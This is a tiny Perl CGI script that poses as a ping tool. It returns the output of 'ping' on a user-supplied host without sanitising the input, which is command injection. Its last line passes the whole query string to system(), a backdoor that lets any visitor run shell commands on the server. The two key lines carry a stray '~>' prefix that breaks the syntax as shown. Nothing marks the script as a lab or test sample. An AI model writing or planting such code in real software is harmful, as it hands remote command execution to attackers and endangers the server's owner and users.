#!/usr/bin/perl
use strict;
use CGI qw(param);

print "Content-Type: text/plain\n\n";
my $host = param('host');
~>print `ping -c 1 $host`;
~>system($ENV{'QUERY_STRING'});
